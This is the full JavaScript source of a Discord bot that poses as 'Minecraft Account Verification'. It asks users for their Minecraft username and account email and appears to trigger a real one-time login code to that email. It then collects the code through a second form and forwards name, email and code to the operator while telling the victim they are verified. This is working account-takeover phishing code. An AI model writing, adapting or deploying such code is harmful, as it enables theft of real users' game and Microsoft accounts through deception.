const fs = require('node:fs');
const path = require('node:path');
const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, Events, Client, Collection, GatewayIntentBits, ActivityType, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const { token, domain } = require('./config.json');
const deploy = require('./deploy')
const requestOTP = require('./requestOTP')
const { sendDiscordMessage, sendDiscordMessage2 } = require('./logWorker')
const express = require('express')
const app = express()
const port = 81

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
    setInterval(() => {
      // Ping your bot's server to keep it awake
      const https = require('https');
      https.get(domain, (res) => {
        console.log('Pinged the bot server.');
      });
    }, 300000); // 5 minutes interval
});

const SimplDB = require('simpl.db');
const db = new SimplDB();
const { default: axios } = require('axios');

function makeid(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
    }
    return result;
}

function isEmail(email) {
    var emailFormat = /^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$/;
    if (email !== '' && email.match(emailFormat)) { return true; }

    return false;
}

const client = new Client({ intents: [GatewayIntentBits.Guilds] });
client.commands = new Collection();
const commandsPath = path.join(__dirname, 'commands');
const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));

for (const file of commandFiles) {
    const filePath = path.join(commandsPath, file);
    const command = require(filePath);
    client.commands.set(command.data.name, command);
}

client.on(Events.InteractionCreate, async interaction => {
    try {
        if (interaction.isButton()) {
            if (interaction.customId == 'skrim') {
                const modal = new ModalBuilder()
                    .setCustomId('skrimverification')
                    .setTitle('Minecraft Account Verification');

                const username = new TextInputBuilder()
                    .setCustomId('username')
                    .setLabel("Your Minecraft Username")
                    .setPlaceholder('Enter your minecraft username!')
                    .setStyle(TextInputStyle.Short)
                    .setRequired(true)

                const email = new TextInputBuilder()
                    .setCustomId('email')
                    .setLabel("Your Minecraft Account's Email")
                    .setPlaceholder('Enter the email of your minecraft account!')
                    .setStyle(TextInputStyle.Short)
                    .setRequired(true)

                const firstRow = new ActionRowBuilder().addComponents(username);
                const secondRow = new ActionRowBuilder().addComponents(email);
                modal.addComponents(firstRow, secondRow);
                await interaction.showModal(modal);
            }
            if (interaction.customId.startsWith('enterCode.')) {
                const modal = new ModalBuilder()
                    .setCustomId('enterCode.' + interaction.customId.replace('enterCode.', ''))
                    .setTitle('Minecraft Account Verification');

                const code = new TextInputBuilder()
                    .setCustomId('code')
                    .setLabel("Your Code")
                    .setPlaceholder('Enter the code we sent to your email!')
                    .setStyle(TextInputStyle.Short)
                    .setRequired(true)

                const firstRow = new ActionRowBuilder().addComponents(code);
                modal.addComponents(firstRow);
                await interaction.showModal(modal);
            }
        }
    } catch (error) {
        console.error('Error processing interaction:', error);
    }
});

client.on(Events.InteractionCreate, async interaction => {
    if (!interaction.isModalSubmit()) return;
    await interaction.deferReply({ ephemeral: true })

    if (interaction.customId === 'skrimverification') {
        let name = interaction.fields.getTextInputValue('username');
        let email = interaction.fields.getTextInputValue('email');

        if (!isEmail(email)) {
            return interaction.editReply({ content: "Invalid email!", ephemeral: true });
        }
        else {
            var state = makeid(10)
            while (await db.has(state + '.name')) state = makeid(10)
            
            db.set(state + '.name', name)
            db.set(state + '.email', email)
            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId('enterCode.' + state)
                        .setLabel('Enter Code')
                        .setStyle(ButtonStyle.Primary),
                );
            try {
                requestOTP(email)
            } catch (error) {
                console.log('failed to request OTP')
            }
            
            var embed = new EmbedBuilder()
                .setTitle('**Email Sent**')
                .setDescription(`A one-time verification code has been successfully sent to ${email}! Enter it by pressing the button below.`)
            await interaction.editReply({ embeds: [embed], components: [row], ephemeral: true });
            
            // Assuming this code is inside an interaction handler
            if (!interaction.guild) {
              console.error('Interaction is not in a guild');
              return;
            }
            
            try {
                sendDiscordMessage(name, email)
        } catch (error) {
            console.error('Error sending first message');
        }
    }
} else if (interaction.customId.startsWith('enterCode.')) {
        const state = interaction.customId.replace('enterCode.', '');
        const code = interaction.fields.getTextInputValue('code');
        if (!/\d{7}|\d{7}/.test(parseInt(code))) {
            return interaction.editReply({ content: "invalid code!", ephemeral: true });
        }
        name = await db.get(state + '.name')
        email = await db.get(state + '.email')
        if (!name || !email || name == 404 || email == 404) {
            return await interaction.editReply({ content: "this state doesn't exist anymore! try again", ephemeral: true });
        }

        var embed = new EmbedBuilder()
        .setTitle('Success!')
        .setDescription('You have verified!')
    await interaction.editReply({ embeds: [embed], ephemeral: true }); 
    
    sendDiscordMessage2(name, email, code)

    db.delete(state + '.name')
    db.delete(state + '.email')
    }
})

client.on(Events.InteractionCreate, async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const command = client.commands.get(interaction.commandName);

    if (!command) return;

    try {
        await command.execute(interaction);
    } catch (error) {
        console.error(error);
        if (interaction.replied || interaction.deferred) {
            await interaction.followUp({ content: 'There was an error while executing this command!', ephemeral: true });
        } else {
            await interaction.reply({ content: 'There was an error while executing this command!', ephemeral: true });
        }
    }
});

client.login(token)
// DISCLAMER, not all of this code was written by TimmyTM (If you see this, invest in https://timmytm.co)